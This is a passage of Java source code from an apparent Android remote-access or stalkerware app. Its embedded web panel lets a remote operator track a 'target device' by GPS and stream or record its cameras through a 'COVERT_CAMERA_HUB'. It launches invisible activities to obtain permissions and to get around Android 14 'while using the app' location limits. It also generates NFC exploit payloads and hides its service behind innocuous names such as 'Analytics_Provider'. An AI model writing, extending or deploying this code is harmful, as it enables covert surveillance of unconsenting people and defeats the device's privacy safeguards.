        html.append("    fetch('/ghost/deploy-overlay?type=' + type).then(r => r.json()).then(d => {");
        html.append("      showToast('OVERLAY_DEPLOYED');");
        html.append("    });");
        html.append("  }");
        html.append("}");
        html.append("</script>");

        html.append(HTML_FOOTER);
        return serveGzipped(session, "text/html", html.toString());
    }

    private Response generateNdef(Map<String, String> params) {
        String url = params.get("url");
        String type = params.get("type");
        boolean isSmart = "smart".equals(type);
        
        byte[] payload = com.labs.labrats.exploits.NfcExploitGenerator.generate(url, isSmart);
        
        StringBuilder hex = new StringBuilder();
        for (byte b : payload) {
            hex.append(String.format("%02X ", b));
        }
        
        String b64 = android.util.Base64.encodeToString(payload, android.util.Base64.NO_WRAP);
        
        return newFixedLengthResponse(Response.Status.OK, "application/json", 
            "{\"success\": true, \"hex\": \"" + hex.toString().trim() + "\", \"base64\": \"" + b64 + "\"}");
    }

    private Response serve404() {
        String html = getHeader("/404") +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#128269;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                "<p>The requested page does not exist.</p>" +
                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/html", html);
    }

    private Response serveError(String message) {
        String html = getHeader("/error") +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#9888;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                "<p>" + escapeHtml(message) + "</p>" +
                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
    }


    private Response serveGpsPage(IHTTPSession session) {
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">&#128205; GPS Satellite Uplink</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        html.append("<p style=\"color: #888; margin-bottom: 25px;\">Active tracking and coordinate extraction for the target device.</p>");
        
        // Map Container
        html.append("<div id=\"map-container\" style=\"width: 100%; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 25px; overflow: hidden; position: relative;\">");
        html.append("<div id=\"map-overlay\" style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); z-index: 5;\">");
        html.append("<div style=\"text-align: center;\"><div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128225;</div><div style=\"color: var(--neon-cyan); letter-spacing: 2px;\">AWAITING_SATELLITE_FIX</div></div>");
        html.append("</div>");
        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" style=\"border:0; filter: invert(90%) hue-rotate(180deg); display: none;\" allowfullscreen></iframe>");
        html.append("</div>");

        // GPS Buttons centered
        html.append("<div class=\"btn-container\" style=\"margin-bottom: 30px; display: flex; justify-content: center; gap: 10px;\">");
        html.append("<button onclick=\"locateDevice()\" class=\"btn\" style=\"margin: 0;\">&#128205; PING_LOCATION</button>");
        html.append("<button id=\"ext-map-btn\" onclick=\"openExternalMap()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); display: none; margin: 0;\">&#128640; OPEN_MAPS</button>");
        html.append("</div>");
        
        html.append("<div class=\"info-item\" style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\">COORD_SYSTEM</div>");
        html.append("<div id=\"coord-display\" class=\"info-value\">WAITING_FOR_DATA...</div>");
        html.append("</div>");

        html.append("<div style=\"padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">LOCATION_STREAM</h3>");
        html.append("<div id=\"gps-log\" style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; line-height: 1.5;\">");
        html.append("<div>[SYSTEM] Tracker standby...</div>");
        html.append("</div></div>");

        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveGpsLocate(Map<String, String> params) {
        logActivity("LOCATE_TRIGGER: Precision GPS uplink initiated");
        boolean hasFineLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean hasCoarseLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!hasFineLocation && !hasCoarseLocation) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission missing. Use REPAIR_PERMISSIONS in the Hardware tab.\"}") :
                    serveError("Location permission missing. Use REPAIR_PERMISSIONS in the Hardware tab.");
        }
        
        // [POLICY_BYPASS_TRIGGER]
        // Bring app to 'TOP' state for a moment to satisfy 'While using the app' permission rules on Android 14+
        try {
            Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
            context.startActivity(bypass);
            Thread.sleep(350); 
        } catch (Exception ignored) {}

        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            // --- MASTER TOGGLE CHECK ---
            boolean isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            
            if (!isGpsEnabled && !isNetworkEnabled) {
                String errorMsg = "LOCATION_SERVICES_DISABLED: The device's master location toggle is OFF. Triangle calibration is impossible.";
                logActivity("LOCATE_ERROR: Master Location Toggle is OFF on target device.");
                return params.containsKey("json") ?
                        newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"" + errorMsg + "\", \"master_off\": true}") :
                        serveError(errorMsg);
            }

            Location location = null;

            // [INSTANT_CACHE_LOOKUP] Try the fastest possible data first
            List<String> providers = locationManager.getProviders(true);
            for (String provider : providers) {
                try {
                    Location l = locationManager.getLastKnownLocation(provider);
                    if (l == null) continue;
                    if (location == null || l.getTime() > location.getTime()) {
                        location = l;
                    }
                } catch (SecurityException ignored) {}
            }

            // [ACTIVE_PING_UPGRADE] Try for a fresh fix, but only wait 4 seconds
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                final java.util.concurrent.CompletableFuture<Location> future = new java.util.concurrent.CompletableFuture<>();
                try {
                    // Always try Network provider first as it is much faster and works indoors
                    String provider = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) 
                                    ? LocationManager.NETWORK_PROVIDER : LocationManager.GPS_PROVIDER;
                    
                    locationManager.getCurrentLocation(
                            provider,
                            null,
                            ContextCompat.getMainExecutor(context),
                            future::complete);
                    
                    // Wait max 4 seconds. If it takes longer, we'll just use the cached data we found above.
                    Location fresh = future.get(4, java.util.concurrent.TimeUnit.SECONDS);
                    if (fresh != null) location = fresh;
                } catch (Exception ignored) {}
            }

            // [PASSIVE_TRIANGULATION] Last ditch effort
            if (location == null) {
                try {
                    location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                } catch (SecurityException ignored) {}
            }

            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                
                // Trigger City Name extraction in background
                LabRatsWorker.execute(() -> {
                    try {
                        android.location.Geocoder geocoder = new android.location.Geocoder(context, Locale.getDefault());
                        List<android.location.Address> addresses = geocoder.getFromLocation(lat, lon, 1);
                        if (addresses != null && !addresses.isEmpty()) {
                            String city = addresses.get(0).getLocality();
                            if (city != null) {
                                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                                    .edit().putString("last_city", city).apply();
                            }
                        }
                    } catch (Exception ignored) {}
                });

                if (params.containsKey("json")) {
                    String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"%s\", \"accuracy\": %f, \"time\": %d}",
                            lat, lon, location.getProvider(), location.getAccuracy(), location.getTime());
                    return newFixedLengthResponse(Response.Status.OK, "application/json", json);
                }

                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
                Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                response.addHeader("Location", mapsUrl);
                return response;
            } else {
                String errorMsg = "SATELLITE_LOCK_FAILED: Triangulation timed out. Ensure the device is near a window or has a clear sky view.";
                if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    errorMsg = "LOCATION_HARDWARE_DISABLED: The user has physically disabled the device's Location toggle.";
                }
                
                return params.containsKey("json") ?
                        newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"" + errorMsg + "\"}") :
                        serveError(errorMsg);
            }
        } catch (SecurityException e) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Permission denied: " + e.getMessage() + "\"}") :
                    serveError("Location permission denied: " + e.getMessage());
        } catch (Exception e) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Internal error: " + e.getMessage() + "\"}") :
                    serveError("Location error: " + e.getMessage());
        }
    }

    private Response serveGpsPermissionRequest() {
        logActivity("LOCATE_MAINTENANCE: Remotely dispatched permission repair sequence.");
        
        // Launch PermissionActivity (Invisible) to trigger the system prompts
        // FLAG_ACTIVITY_MULTIPLE_TASK ensures it can be re-launched even if "stuck"
        Intent i = new Intent(context, PermissionActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
        context.startActivity(i);
        
        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Stealth permission sequence dispatched to target device.\"}");
    }

    private String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }

    private String getFileThumbnailBase64(File file) {
        try {
            android.graphics.BitmapFactory.Options options = new android.graphics.BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            android.graphics.BitmapFactory.decodeFile(file.getAbsolutePath(), options);
            
            // Scaled down for list view (max 120px)
            options.inSampleSize = calculateInSampleSize(options, 120, 120);
            options.inJustDecodeBounds = false;
            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeFile(file.getAbsolutePath(), options);
            if (bitmap == null) return "";
            
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
            String b64 = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP);
            bitmap.recycle();
            return b64;
        } catch (Exception e) {
            return "";
        }
    }

    private int calculateInSampleSize(android.graphics.BitmapFactory.Options options, int reqWidth, int reqHeight) {
        final int height = options.outHeight;
        final int width = options.outWidth;
        int inSampleSize = 1;
        if (height > reqHeight || width > reqWidth) {
            final int halfHeight = height / 2;
            final int halfWidth = width / 2;
            while ((halfHeight / inSampleSize) >= reqHeight && (halfWidth / inSampleSize) >= reqWidth) {
                inSampleSize *= 2;
            }
        }
        return inSampleSize;
    }

    private String getFileIcon(File file) {
        if (file.isDirectory())
            return "&#128193;";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "&#128444;";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "&#127916;";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "&#127925;";
        if (name.matches(".*\\.(pdf)$"))
            return "&#128196;";
        if (name.matches(".*\\.(doc|docx|txt|rtf)$"))
            return "&#128221;";
        if (name.matches(".*\\.(xls|xlsx|csv)$"))
            return "&#128202;";
        if (name.matches(".*\\.(zip|rar|7z|tar|gz)$"))
            return "&#128230;";
        if (name.matches(".*\\.(apk)$"))
            return "&#128241;";
        return "&#128196;";
    }

    private String getFileIconClass(File file) {
        if (file.isDirectory())
            return "folder-icon";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "file-icon-image";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "file-icon-video";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "file-icon-audio";
        if (name.matches(".*\\.(pdf|doc|docx|txt|rtf|xls|xlsx|csv)$"))
            return "file-icon-doc";
        return "file-icon-default";
    }

    private String getMimeType(String filename) {
        String name = filename.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg"))
            return "image/jpeg";
        if (name.endsWith(".png"))
            return "image/png";
        if (name.endsWith(".gif"))
            return "image/gif";
        if (name.endsWith(".mp4"))
            return "video/mp4";
        if (name.endsWith(".mp3"))
            return "audio/mpeg";
        if (name.endsWith(".pdf"))
            return "application/pdf";
        if (name.endsWith(".zip"))
            return "application/zip";
        if (name.endsWith(".apk"))
            return "application/vnd.android.package-archive";
        return "application/octet-stream";
    }

    private String formatFileSize(long size) {
        if (size < 1024)
            return size + " B";
        if (size < 1024 * 1024)
            return String.format("%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024)
            return String.format("%.1f MB", size / (1024.0 * 1024));
        return String.format("%.1f GB", size / (1024.0 * 1024 * 1024));
    }

    private String formatDuration(int seconds) {
        if (seconds < 60)
            return seconds + "s";
        if (seconds < 3600)
            return String.format("%dm %ds", seconds / 60, seconds % 60);
        return String.format("%dh %dm", seconds / 3600, (seconds % 3600) / 60);
    }

    // ============ Camera Methods ============

    private Response serveCameraPage(IHTTPSession session) {
        logActivity("OPTICS_UPLINK: Tactical surveillance hub accessed");
        boolean nightMode = Analytics_Provider.isNightModeEnabled(context);
        Map<String, String> params = session.getParms();
        
        // Don't default to a camera ID so none start as "Selected"
        String camId = params.get("cam");
        boolean autostart = "true".equals(params.get("autostart"));
        
        String res = params.get("res");
        if (res == null) res = "low";
        
        int resIndex = 2;
        if ("ultra_low".equals(res)) resIndex = 0;
        else if ("very_low".equals(res)) resIndex = 1;
        else if ("low".equals(res)) resIndex = 2;
        else if ("medium".equals(res)) resIndex = 3;
        else if ("high".equals(res)) resIndex = 4;
        else if ("very_high".equals(res)) resIndex = 5;

        // Resolution presets
        int width, height, quality, fps;
        switch (res) {
            case "ultra_low": width = 320; height = 240; quality = 12; fps = 2; break;
            case "very_low": width = 480; height = 320; quality = 20; fps = 4; break;
            case "medium": width = 640; height = 480; quality = 50; fps = 8; break;
            case "high": width = 1280; height = 720; quality = 85; fps = 10; break;
            case "very_high": width = 1920; height = 1080; quality = 100; fps = 10; break;
            case "low":
            default: width = 640; height = 480; quality = 35; fps = 6; break;
        }

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.1rem;\">&#128247; COVERT_CAMERA_HUB</h2>");
        
        // Advanced Tactical Indicator - Placed UNDER title for mobile clarity
        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap; margin-bottom: 20px;\">");
        html.append("<span class=\"badge-dot\" id=\"indicator-dot\" style=\"font-size: 0.5rem;\">&#9679;</span>&nbsp;");
        html.append("<span id=\"indicator-text\">STANDBY</span>");
        html.append("</div>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>Camera permission missing.</p></div></div>").append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Live Feed Container (Fill widescreen on PC)
        html.append("<style>");
        html.append("@media(min-width:769px){ #stream-container { max-width: 100% !important; height: 600px !important; } #main-stream { object-fit: cover !important; } }");
        html.append("@media(max-width:768px){ #stream-container { height: 400px !important; } #main-stream { object-fit: contain !important; } }");
        html.append("</style>");
        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
        html.append("<div id=\"stream-container\" style=\"width:100%; max-width:100% !important; height: 450px; background:#000; margin:0 auto; border-radius:8px; border:1px solid var(--neon-cyan); position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
        html.append("<img id=\"main-stream\" style=\"width: 100%; height: 100%; object-fit: contain; ").append(autostart ? "display: block;" : "display: none;").append("\" />");
        html.append("<div id=\"loading-overlay\" style=\"position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:var(--neon-cyan); font-size:0.75rem; font-family:monospace; letter-spacing:2px; z-index: 5;\">").append(autostart ? "INITIALIZING_UPLINK..." : "Uplink_Ready").append("</div>");
        html.append("</div></div>");

        // Resolution Slider
        html.append("<div style=\"margin-bottom: 20px; text-align: center;\">");
        html.append("<div class=\"info-label\">UPLINK_QUALITY_STATION</div>");
        html.append("<div style=\"position: relative; width: 100%; max-width: 500px; margin: 0 auto; padding: 0 10px;\">");
        html.append("<input type=\"range\" id=\"quality-slider\" min=\"0\" max=\"5\" value=\"").append(resIndex).append("\" onchange=\"applyQuality(this.value)\" style=\"width: 100%; margin: 0; padding: 0; cursor: pointer;\">");
        html.append("<div style=\"position: relative; width: 100%; height: 20px; font-size: 0.5rem; color: #777; font-family: monospace; letter-spacing: 0; margin-top: 8px;\">");
        html.append("<span style=\"position: absolute; left: 0; top: 0; white-space: nowrap;\">ULTRA LOW</span>");
        html.append("<span style=\"position: absolute; left: 20%; top: 0; transform: translateX(-50%);\">VL</span>");
        html.append("<span style=\"position: absolute; left: 40%; top: 0; transform: translateX(-50%);\">L</span>");
        html.append("<span style=\"position: absolute; left: 60%; top: 0; transform: translateX(-50%);\">M</span>");
        html.append("<span style=\"position: absolute; left: 80%; top: 0; transform: translateX(-50%);\">H</span>");
        html.append("<span style=\"position: absolute; right: 0; top: 0; white-space: nowrap; text-align: right;\">VERY HIGH</span>");
        html.append("</div></div></div>");

        // Camera Selection & Start
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        html.append("<div style=\"margin-bottom: 10px; text-align: center;\"><div class=\"info-label\">CAMERAS</div></div>");
        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; margin-bottom: 25px; flex-wrap:wrap;\">");
        for (CameraHelper.CameraInfo cam : cameras) {
            String btnText = cam.facing.equalsIgnoreCase("back") ? "START_BACK" : "START_FRONT";
            // Only show solid green if THIS camera is active
            boolean isActive = (camId != null && cam.id.equals(camId) && autostart);
            String btnClass = isActive ? "btn btn-small btn-engaged-green cam-btn" : "btn btn-small cam-btn";
            String inlineStyle = "min-width:140px; margin:0;" + (isActive ? "" : " border-color:var(--neon-green); color:var(--neon-green);");
            html.append("<button id=\"cam-btn-").append(cam.id).append("\" onclick=\"initiateStream('").append(cam.id).append("')\" class=\"").append(btnClass).append("\" style=\"").append(inlineStyle).append("\">&#9654; ").append(btnText).append("</button>");
        }
        html.append("</div>");

        // Unified Actions
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 450px; margin: 0 auto;\">");
        html.append("<button onclick=\"rotateStream()\" class=\"btn btn-small\" style=\"border-color:#f39c12; color:#f39c12; margin:0; width:100%;\">ROTATE</button>");
        html.append("<button onclick=\"capturePhoto()\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); margin:0; width:100%;\">SNAP</button>");
        
        html.append("<button id=\"night-btn\" onclick=\"toggleNightMode()\" class=\"btn btn-small ").append(nightMode ? "btn-active-yellow" : "").append("\" style=\"border-color:var(--neon-yellow); color:var(--neon-yellow); margin:0; width:100%;\">NIGHTMODE</button>");
        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; width:100%;\">START_RECORDING</button>");
        
        html.append("<button onclick=\"terminateCaptures()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color:var(--danger); color:var(--danger); margin:0; width:100%;\">TERMINATE_CAPTURE</button>");
        html.append("</div>");

        // Script block
        html.append("<script>");
        html.append("var camId = ").append(camId != null ? "'" + camId + "'" : "null").append(";");
        html.append("var streamActive = ").append(autostart).append(";");
        html.append("var currentRotation = 0;");
        html.append("const resOptions = ['ultra_low', 'very_low', 'low', 'medium', 'high', 'very_high'];");
        html.append("const resConfig = {");
        html.append("  'ultra_low': { w: 640, h: 480, q: 15, fps: 2 },");
        html.append("  'very_low':  { w: 640, h: 480, q: 25, fps: 4 },");
        html.append("  'low':       { w: 640, h: 480, q: 35, fps: 6 },");
        html.append("  'medium':    { w: 640, h: 480, q: 45, fps: 8 },");
        html.append("  'high':      { w: 1920, h: 1080, q: 85, fps: 10 },");
        html.append("  'very_high': { w: 1920, h: 1080, q: 100, fps: 10 }");
        html.append("};");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var streamFps = ").append(fps).append(";");
        
        html.append("function rotateStream() { currentRotation = (currentRotation + 90) % 360; document.getElementById('main-stream').style.transform = 'rotate(' + currentRotation + 'deg)'; }");
        
        html.append("function applyQuality(val) { ");
        html.append("  const config = resConfig[resOptions[val]];");
        html.append("  streamWidth = config.w; streamHeight = config.h; streamQuality = config.q; streamFps = config.fps;");
        html.append("  if(streamActive) { startStream(); }");
        html.append("}");
        
        html.append("async function initiateStream(id) { ");
        html.append("  camId = id; streamActive = true; ");
        html.append("  document.getElementById('loading-overlay').style.display = 'block'; ");
        html.append("  document.getElementById('loading-overlay').innerText = 'INITIALIZING_UPLINK...'; ");
        
        // Indicator -> LIVE (Green + Slow Blink)
        html.append("  const ind = document.getElementById('live-indicator');");
        html.append("  const dot = document.getElementById('indicator-dot');");
        html.append("  const txt = document.getElementById('indicator-text');");
        html.append("  ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';");
        html.append("  dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';");
        
        // Dynamic Button Response
        html.append("  document.querySelectorAll('.cam-btn').forEach(b => { ");
        html.append("    b.classList.remove('btn-engaged-green'); ");
        html.append("    b.style.borderColor = 'var(--neon-green)'; ");
        html.append("    b.style.color = 'var(--neon-green)'; ");
        html.append("  }); ");
        html.append("  const activeBtn = document.getElementById('cam-btn-' + id); ");
        html.append("  if(activeBtn) { ");
        html.append("    activeBtn.classList.add('btn-engaged-green'); ");
        html.append("    activeBtn.style.borderColor = ''; ");
        html.append("    activeBtn.style.color = ''; ");
        html.append("  } ");
        
        html.append("  const img = document.getElementById('main-stream');");
        html.append("  img.style.display = 'none';"); // Hide while switching
        html.append("  await fetch('/camera/stop-stream'); ");
        html.append("  setTimeout(() => { ");
        html.append("    img.src = '/camera/stream?cam=' + id + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality + '&t=' + Date.now();");
        html.append("    img.onload = () => { document.getElementById('loading-overlay').style.display = 'none'; img.style.display = 'block'; };");
        html.append("  }, 500); ");
        html.append("}");
        
        html.append("function startStream() { initiateStream(camId); }");
        
        html.append("function toggleNightMode() { fetch('/camera/night-mode').then(r => r.json()).then(d => { document.getElementById('night-btn').classList.toggle('btn-active-yellow', d.nightMode); }); }");
        
        html.append("function terminateCaptures() { ");
        html.append("  streamActive = false; ");
        html.append("  const img = document.getElementById('main-stream'); img.src = ''; img.style.display = 'none'; ");
        html.append("  document.getElementById('loading-overlay').style.display = 'block'; ");
        html.append("  document.getElementById('loading-overlay').innerText = 'Uplink_Ready'; ");
        
        // Indicator -> STANDBY (Yellow + Solid)
        html.append("  const ind = document.getElementById('live-indicator');");
        html.append("  const dot = document.getElementById('indicator-dot');");
        html.append("  const txt = document.getElementById('indicator-text');");
        html.append("  ind.style.borderColor = 'var(--neon-yellow)'; ind.style.color = 'var(--neon-yellow)'; ind.style.background = 'rgba(255, 255, 0, 0.05)';");
        html.append("  dot.className = 'badge-dot'; txt.innerText = 'STANDBY';");
        
        // Reset Buttons
        html.append("  document.querySelectorAll('.cam-btn').forEach(b => { ");
        html.append("    b.classList.remove('btn-engaged-green'); ");
        html.append("    b.style.borderColor = 'var(--neon-green)'; ");
        html.append("    b.style.color = 'var(--neon-green)'; ");
        html.append("  }); ");
        
        html.append("  fetch('/camera/terminate').then(() => { document.getElementById('rec-btn').innerText = 'START_RECORDING'; }); ");
        html.append("}");
        
        html.append("function capturePhoto() { if(!camId) { alert('SELECT_CAMERA_FIRST'); return; } window.open('/camera/photo?cam=' + camId, '_blank'); }");
        
        html.append("function toggleRecording() { const btn = document.getElementById('rec-btn'); if(!streamActive) { alert('START_FEED_FIRST'); return; } if(btn.innerText.includes('START')) { btn.innerText = 'STOP_RECORDING'; fetch('/camera/record?cam=' + camId); } else { btn.innerText = 'START_RECORDING'; fetch('/camera/stop-record'); } }");
        
        html.append("function checkRecStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    const ind = document.getElementById('live-indicator');");
        html.append("    const dot = document.getElementById('indicator-dot');");
        html.append("    const txt = document.getElementById('indicator-text');");
        html.append("    const recBtn = document.getElementById('rec-btn');");
        html.append("    if (d.recording) {");
        html.append("      ind.style.borderColor = 'var(--danger)'; ind.style.color = 'var(--danger)'; ind.style.background = 'rgba(255, 49, 49, 0.15)';");
        html.append("      dot.className = 'badge-dot blink-fast'; txt.innerText = 'REC (' + d.duration + 's)';");
        html.append("      recBtn.innerText = 'STOP_RECORDING';");
        html.append("    } else if (streamActive) {");
        html.append("      ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';");
        html.append("      dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';");
        html.append("      recBtn.innerText = 'START_RECORDING';");
        html.append("    } else {");
        html.append("      ind.style.borderColor = 'var(--neon-yellow)'; ind.style.color = 'var(--neon-yellow)'; ind.style.background = 'rgba(255, 255, 0, 0.05)';");
        html.append("      dot.className = 'badge-dot'; txt.innerText = 'STANDBY';");
        html.append("      recBtn.innerText = 'START_RECORDING';");
        html.append("    }");
        html.append("  });");
        html.append("}");
        html.append("window.onload = () => { const scroll = localStorage.getItem('optics_scroll'); if(scroll) { window.scrollTo(0, parseInt(scroll)); localStorage.removeItem('optics_scroll'); } if(streamActive && camId) { initiateStream(camId); } };");
        html.append("setInterval(checkRecStatus, 2000);");
        html.append("</script>");

        html.append("</div>").append(HTML_FOOTER);
        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveCameraCapture(Map<String, String> params, IHTTPSession session) {
        String cameraId = params.get("cam");
        logActivity("OPTICS_TRIGGER: Capture command sent to camera " + (cameraId != null ? cameraId : "0"));
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0"; // Default to back camera
        }

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Capturing Photo...</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        try {
            byte[] imageData = null;
            String error = null;

            if (Analytics_Provider.isCurrentlyStreaming()) {
                // If streaming, grab latest frame for instant snapshot
                imageData = Analytics_Provider.getNextFrame(1000);
                if (imageData == null) error = "Timeout waiting for frame from stream";
            } else {
                // Use Analytics_Provider's background capture protocol
                Analytics_Provider service = Analytics_Provider.getInstance();
